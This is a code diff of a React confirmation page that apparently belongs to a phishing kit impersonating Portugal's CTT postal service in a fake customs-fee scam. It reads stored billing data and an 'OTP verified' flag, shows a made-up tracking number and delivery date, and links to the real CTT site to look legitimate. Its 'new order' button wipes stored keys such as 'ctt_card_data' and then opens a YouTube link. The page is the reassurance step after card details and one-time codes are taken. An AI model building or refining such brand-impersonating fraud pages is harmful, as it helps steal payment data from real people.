@@ -1,245 +1,179 @@
-import React, { useEffect, useState } from 'react';
+import React, { useState, useEffect } from 'react';
+import { useNavigate } from 'react-router-dom';
 import { Card, CardContent } from './ui/card';
 import { Button } from './ui/button';
-import { CheckCircle, Package, Clock, MapPin, Mail, Phone } from 'lucide-react';
-import { useToast } from '../hooks/use-toast';
-import { useNavigate } from 'react-router-dom';
+import { CheckCircle, Package, MapPin, Calendar, Truck } from 'lucide-react';
 
 const CTTConfirmation = () => {
-  const [trackingNumber, setTrackingNumber] = useState('');
-  const { toast } = useToast();
   const navigate = useNavigate();
+  const [billingData, setBillingData] = useState(null);
+  const [trackingNumber, setTrackingNumber] = useState('');
+  const [deliveryDate, setDeliveryDate] = useState('');
 
   useEffect(() => {
-    // Generate a realistic tracking number
-    const generateTrackingNumber = () => {
-      const prefix = 'RR';
-      const middle = Math.floor(Math.random() * 900000000) + 100000000; // 9 digits
-      const suffix = 'PT';
-      return `${prefix}${middle}${suffix}`;
-    };
-
-    setTrackingNumber(generateTrackingNumber());
-  }, []);
-
-  const handleTrackPackage = () => {
-    toast({
-      title: "Redirecionando...",
-      description: "A carregar página de rastreamento da encomenda",
-      duration: 2000
-    });
+    // Get data from localStorage
+    const storedBillingData = localStorage.getItem('ctt_billing_data');
+    const storedTrackingNumber = localStorage.getItem('ctt_tracking_number');
+    const otpVerified = localStorage.getItem('ctt_otp_verified');
     
-    setTimeout(() => {
-      navigate('/tracking');
-    }, 2000);
+    if (storedBillingData && otpVerified) {
+      setBillingData(JSON.parse(storedBillingData));
+      
+      // Generate or use stored tracking number
+      let tracking = storedTrackingNumber;
+      if (!tracking) {
+        // Generate random tracking number in format RR#########PT
+        const randomNumbers = Math.random().toString().slice(2, 11);
+        tracking = `RR${randomNumbers}PT`;
+        localStorage.setItem('ctt_tracking_number', tracking);
+      }
+      setTrackingNumber(tracking);
+      
+      // Calculate delivery date (5 business days from now)
+      const calculateDeliveryDate = () => {
+        const today = new Date();
+        let businessDays = 0;
+        let currentDate = new Date(today);
+        
+        while (businessDays < 5) {
+          currentDate.setDate(currentDate.getDate() + 1);
+          const dayOfWeek = currentDate.getDay();
+          
+          // Skip weekends (Saturday = 6, Sunday = 0)
+          if (dayOfWeek !== 0 && dayOfWeek !== 6) {
+            businessDays++;
+          }
+        }
+        
+        return currentDate.toLocaleDateString('pt-PT', {
+          weekday: 'long',
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric'
+        });
+      };
+      
+      setDeliveryDate(calculateDeliveryDate());
+    } else {
+      // If no verification data, redirect to billing page
+      navigate('/billing');
+    }
+  }, [navigate]);
+
+  const handleTrackOrder = () => {
+    // Redirect to CTT website
+    window.open('https://www.ctt.pt/particulares/index', '_blank');
   };
 
-  const handleSendEmail = () => {
-    toast({
-      title: "Email enviado!",
-      description: "Receberá a confirmação no seu email em breve",
-      duration: 3000
-    });
+  const handleNewOrder = () => {
+    // Clear localStorage and redirect to YouTube
+    localStorage.removeItem('ctt_billing_data');
+    localStorage.removeItem('ctt_card_data');
+    localStorage.removeItem('ctt_otp_verified');
+    localStorage.removeItem('ctt_tracking_number');
+    localStorage.removeItem('ctt_billing_id');
+    
+    window.open('https://youtu.be/xvFZjo5PgG0?list=RDxvFZjo5PgG0', '_blank');
   };
 
-  const handleDownloadReceipt = () => {
-    toast({
-      title: "Recibo gerado",
-      description: "O seu recibo de pagamento será descarregado em breve",
-      duration: 3000
-    });
-  };
+  if (!billingData) {
+    return <div>Carregando...</div>;
+  }
 
   return (
-    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
-      {/* Success Header */}
-      <div className="text-center mb-8">
-        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-          <CheckCircle className="w-8 h-8 text-green-600" />
-        </div>
-        <h1 className="text-2xl font-bold text-gray-900 mb-2">
-          Pagamento realizado com sucesso!
-        </h1>
-        <p className="text-gray-600">
-          A sua taxa alfandegária foi paga. A encomenda será entregue nos próximos dias úteis.
-        </p>
-      </div>
-
-      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-        {/* Payment Summary */}
-        <Card className="shadow-lg border-0 rounded-lg">
-          <CardContent className="p-6">
-            <h2 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
-              <CheckCircle className="w-5 h-5 text-green-600 mr-2" />
-              Resumo do Pagamento
+    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
+        <CardContent className="p-8">
+          {/* Success Header */}
+          <div className="text-center mb-8">
+            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+              <CheckCircle className="w-8 h-8 text-green-600" />
+            </div>
+            <h2 className="text-2xl font-bold text-gray-900 mb-2">
+              Pagamento realizado com sucesso!
             </h2>
-            
-            <div className="space-y-4">
-              <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                <span className="text-gray-600">Taxa alfandegária</span>
-                <span className="font-semibold text-gray-900">€ 2,99</span>
-              </div>
-              
-              <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                <span className="text-gray-600">Taxa de processamento</span>
-                <span className="font-semibold text-gray-900">€ 0,00</span>
-              </div>
-              
-              <div className="flex justify-between items-center py-2 font-bold text-lg">
-                <span className="text-gray-900">Total pago</span>
-                <span className="text-green-600">€ 2,99</span>
-              </div>
-            </div>
+            <p className="text-gray-600">
+              A sua encomenda está a ser processada
+            </p>
+          </div>
 
-            <div className="mt-6 p-4 bg-green-50 rounded-lg">
-              <div className="flex items-center text-green-800 text-sm">
-                <CheckCircle className="w-4 h-4 mr-2" />
-                <span className="font-medium">Pagamento confirmado às {new Date().toLocaleTimeString('pt-PT')}</span>
-              </div>
-            </div>
-
-            <Button 
-              onClick={handleDownloadReceipt}
-              variant="outline" 
-              className="w-full mt-4 border-red-600 text-red-600 hover:bg-red-50"
-            >
-              Descarregar recibo
-            </Button>
-          </CardContent>
-        </Card>
-
-        {/* Tracking Information */}
-        <Card className="shadow-lg border-0 rounded-lg">
-          <CardContent className="p-6">
-            <h2 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
-              <Package className="w-5 h-5 text-red-600 mr-2" />
-              Informações da Encomenda
-            </h2>
-            
-            <div className="space-y-4">
-              <div className="p-4 bg-gray-50 rounded-lg">
-                <div className="text-sm text-gray-600 mb-1">Número de rastreamento</div>
-                <div className="text-lg font-mono font-bold text-gray-900 tracking-wider">
-                  {trackingNumber}
-                </div>
-              </div>
-
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <div className="text-sm text-gray-600 mb-1">Estado atual</div>
-                  <div className="font-semibold text-orange-600 flex items-center">
-                    <Clock className="w-4 h-4 mr-1" />
-                    Taxa paga - Em trânsito
-                  </div>
-                </div>
-                
-                <div>
-                  <div className="text-sm text-gray-600 mb-1">Entrega prevista</div>
-                  <div className="font-semibold text-gray-900">
-                    {new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toLocaleDateString('pt-PT')}
-                  </div>
-                </div>
-              </div>
-
-              <div>
-                <div className="text-sm text-gray-600 mb-1">Endereço de entrega</div>
-                <div className="font-semibold text-gray-900 flex items-start">
-                  <MapPin className="w-4 h-4 mr-1 mt-0.5 text-gray-400" />
-                  <div>
-                    Rua das Flores, 123<br />
-                    1000-100 Lisboa<br />
-                    Portugal
-                  </div>
+          {/* Order Details */}
+          <div className="space-y-6">
+            {/* Tracking Number */}
+            <div className="bg-gray-50 rounded-lg p-4">
+              <div className="flex items-center">
+                <Package className="w-5 h-5 text-red-600 mr-2" />
+                <div className="flex-1">
+                  <h3 className="font-semibold text-gray-900">Número de rastreio</h3>
+                  <p className="text-lg font-mono text-red-600">{trackingNumber}</p>
                 </div>
               </div>
             </div>
 
-            <Button 
-              onClick={handleTrackPackage}
-              className="w-full mt-6 bg-red-600 hover:bg-red-700 text-white"
-            >
-              Rastrear encomenda
-            </Button>
-          </CardContent>
-        </Card>
-      </div>
-
-      {/* Next Steps */}
-      <Card className="shadow-lg border-0 rounded-lg mt-8">
-        <CardContent className="p-6">
-          <h2 className="text-lg font-semibold text-gray-900 mb-4">
-            Próximos passos
-          </h2>
-          
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div className="text-center">
-              <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                <Mail className="w-6 h-6 text-blue-600" />
-              </div>
-              <h3 className="font-semibold text-gray-900 mb-2">Confirmação por email</h3>
-              <p className="text-sm text-gray-600 mb-3">
-                Receberá um email de confirmação com todos os detalhes
-              </p>
-              <Button 
-                onClick={handleSendEmail}
-                variant="outline" 
-                size="sm"
-                className="border-blue-600 text-blue-600 hover:bg-blue-50"
-              >
-                Reenviar email
-              </Button>
-            </div>
-
-            <div className="text-center">
-              <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                <Package className="w-6 h-6 text-orange-600" />
-              </div>
-              <h3 className="font-semibold text-gray-900 mb-2">Processamento</h3>
-              <p className="text-sm text-gray-600 mb-3">
-                A sua encomenda será processada e enviada em 24h
-              </p>
-              <div className="text-xs text-orange-600 font-medium">
-                Em processamento
+            {/* Status */}
+            <div className="bg-blue-50 rounded-lg p-4">
+              <div className="flex items-center">
+                <Truck className="w-5 h-5 text-blue-600 mr-2" />
+                <div className="flex-1">
+                  <h3 className="font-semibold text-gray-900">Estado atual</h3>
+                  <p className="text-blue-600">Processamento inicial - Taxa paga</p>
+                </div>
               </div>
             </div>
 
-            <div className="text-center">
-              <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
-                <Phone className="w-6 h-6 text-green-600" />
+            {/* Delivery Date */}
+            <div className="bg-green-50 rounded-lg p-4">
+              <div className="flex items-center">
+                <Calendar className="w-5 h-5 text-green-600 mr-2" />
+                <div className="flex-1">
+                  <h3 className="font-semibold text-gray-900">Entrega prevista</h3>
+                  <p className="text-green-600">{deliveryDate}</p>
+                </div>
               </div>
-              <h3 className="font-semibold text-gray-900 mb-2">Contacto de entrega</h3>
-              <p className="text-sm text-gray-600 mb-3">
-                Será contactado antes da entrega
-              </p>
-              <div className="text-xs text-green-600 font-medium">
-                +351 912 345 678
+            </div>
+
+            {/* Delivery Address */}
+            <div className="bg-gray-50 rounded-lg p-4">
+              <div className="flex items-center">
+                <MapPin className="w-5 h-5 text-gray-600 mr-2" />
+                <div className="flex-1">
+                  <h3 className="font-semibold text-gray-900">Endereço de entrega</h3>
+                  <p className="text-gray-600">
+                    {billingData.endereco}<br />
+                    {billingData.codigoPostal} {billingData.cidade}
+                  </p>
+                </div>
               </div>
             </div>
           </div>
+
+          {/* Action Buttons */}
+          <div className="mt-8 space-y-4">
+            <Button
+              onClick={handleTrackOrder}
+              className="w-full bg-red-600 hover:bg-red-700 text-white py-3 text-lg font-medium"
+            >
+              Rastrear Encomenda
+            </Button>
+            
+            <Button
+              onClick={handleNewOrder}
+              variant="outline"
+              className="w-full border-red-600 text-red-600 hover:bg-red-50 py-3 text-lg font-medium"
+            >
+              Nova Encomenda
+            </Button>
+          </div>
+
+          {/* Footer Info */}
+          <div className="mt-8 text-center text-sm text-gray-500">
+            <p>Será enviado um email de confirmação para {billingData.email}</p>
+            <p className="mt-2">
+              Para questões sobre a sua encomenda, contacte-nos através do número de rastreio acima.
+            </p>
+          </div>
         </CardContent>
       </Card>
-
-      {/* Footer Actions */}
-      <div className="text-center mt-8">
-        <div className="text-sm text-gray-600 mb-4">
-          Precisa de ajuda? Contacte o nosso apoio ao cliente: 707 26 26 26
-        </div>
-        <div className="space-x-4">
-          <Button 
-            variant="outline"
-            onClick={() => navigate('/billing')}
-            className="border-gray-300 text-gray-700 hover:bg-gray-50"
-          >
-            Nova encomenda
-          </Button>
-          <Button 
-            onClick={handleTrackPackage}
-            className="bg-red-600 hover:bg-red-700 text-white"
-          >
-            Ver rastreamento
-          </Button>
-        </div>
-      </div>
     </div>
   );
 };
